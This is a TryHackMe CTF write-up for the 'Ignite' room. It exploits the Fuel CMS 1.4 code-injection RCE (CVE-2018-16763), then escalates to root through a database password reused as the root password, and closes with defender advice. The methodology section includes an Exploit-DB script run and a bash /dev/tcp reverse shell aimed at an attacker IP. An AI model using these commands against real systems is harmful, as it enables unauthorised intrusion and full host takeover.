---
title: "Ignite"
date: 2026-05-01
platform: TryHackMe
difficulty: Easy
category: offensive
summary: "Fuel CMS 1.4.1 unauthenticated RCE via CVE-2018-16763 (create_function code injection), www-data shell, then a plaintext MySQL root password reused as the system root password."
---

## Overview

Ignite is an easy TryHackMe room that is really a *credential-reuse story dressed up as an RCE*. The Fuel CMS welcome page volunteers its version number, the admin path, and the documented default credentials. A patched-but-not-deployed CMS hands over an unauthenticated shell. The actual privesc happens because the database administrator password and the system root password are the same string.

This room is a textbook example of why **operational hygiene** (independent secrets per account, secrets out of the web root) is the load-bearing security control, not patch level.

## Tools Used

- **nmap** for the port scan.
- **Firefox** for browsing the CMS and reading version banners.
- **searchsploit** for matching the version to a known CVE.
- **Exploit-DB script 47138.py** (Python 2 wrapper for the CVE).
- **python2** to run the exploit.
- **netcat** to catch the reverse shell.
- **su** for the privesc.

## Methodology

**Step 1 - Service enumeration.** A standard port scan returns exactly one open port: HTTP on 80 (Apache 2.4.18 on Ubuntu). 65534 closed ports rule out the usual SSH/SMB surprises and force the engagement straight at the web app.

```bash
nmap -p- -sV <TARGET_IP>
```

**Step 2 - Read the landing page carefully.** Browsing to the target loads a getting-started page for **Fuel CMS** that openly advertises:

- The CMS name and version: *Welcome to Fuel CMS, Version 1.4*.
- The admin panel location: */fuel/*.
- The default credentials documented in the install guide.
- The location of the database config file: */fuel/application/config/database.php*.

This is one of the biggest **information disclosure** issues I have seen in any beginner room, and it is a pure example of why install pages should never survive into production. Modern attackers do not "fingerprint" applications; they grep CVE databases by version string.

**Step 3 - robots.txt confirms the admin path.** /robots.txt contains a single line: *Disallow: /fuel/*. That corroborates the admin path the landing page already disclosed. Same lesson as Mr Robot: robots.txt is *a hint to crawlers, not an access control*.

**Step 4 - Match the version to a CVE.** searchsploit returns a single hit for the recovered version.

```bash
searchsploit fuel cms
```

The bug is **CVE-2018-16763**, an unauthenticated **Remote Code Execution** vulnerability in */fuel/pages/select/*. The endpoint accepts a *filter* query parameter and concatenates it directly into PHP's *create_function()* call. **create_function** is an old, deprecated PHP feature that compiles a string into a runnable function at runtime. Concatenating user input into it is the textbook **Code Injection** sink. An attacker closes the intended expression with a parenthesis and appends arbitrary PHP, which the server then runs.

**Step 5 - Run the exploit.** A simple Python 2 wrapper script (Exploit-DB 47138) automates the URL encoding and command running.

```bash
python2 47138.py
# cmd: ls
# (output shows the web root contents - code execution confirmed)
```

**Step 6 - Reverse shell.** A bash reverse shell payload sent through the same exploit prompt lands a callback on netcat as **www-data**.

```bash
# attacker:
nc -lvnp 4444

# in exploit prompt:
cmd: bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
```

A standard PTY upgrade follows: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `export TERM=xterm`, and `Ctrl-Z; stty raw -echo; fg`.

**Step 7 - Read database.php.** The Fuel install guide on the landing page told me exactly where the database credentials live. Reading the config file from the www-data shell:

```bash
cat /var/www/html/fuel/application/config/database.php
```

The MySQL root password is stored in plaintext inside the web root. The user/pass tuple is *root* / *some-string*.

**Step 8 - Test the credential reuse hypothesis.** By itself, that is a database credential, not a system credential. But on small installs it is extremely common for the same operator password to be reused for the system root account, so testing it is the obvious next step.

```bash
su root
# password from database.php
```

It works on the first try.

## Key Takeaways

- **The whole chain in this room is a credential-reuse story dressed up as an RCE.** Even if the CMS were patched, the box would still fall the moment any other vulnerability surfaced *database.php*.
- **A "version 1.4" string on a landing page is a working exploit.** Modern attackers do not fingerprint, they grep CVE feeds.
- **Default credentials in install documentation are themselves a vulnerability.**
- ***create_function* is a code-injection sink waiting to happen.** Any function that compiles strings into runnable code (eval, create_function, JavaScript new Function, Python exec) is one user-input touch away from RCE.
- **Always read every config file your foothold can reach.** The path from www-data to root in this room was a single cat command on a file the web user could read by design.

## What a Defender Should Do

- Upgrade Fuel CMS or remove it. *create_function* was deprecated in PHP 7.2 and removed in PHP 8 for exactly this reason. Set `allow_url_include = Off` in php.ini globally.
- Delete install/getting-started pages once setup is complete. Strip *Server* and *X-Powered-By* response headers, and never hardcode default credential text in production-facing templates.
- Force a password change on first login for every administrative account. Refuse to start the application until the default credentials are rotated.
- Move secrets out of the web root entirely. Read database credentials from environment variables loaded by systemd, from a real secrets manager (Vault, AWS Secrets Manager), or from a 0640-mode file outside any directory the web server serves.
- Generate independent, high-entropy passwords for every privileged account and store them in a password manager. Never reuse the same string across two trust boundaries (database, system, application, cloud, VPN).
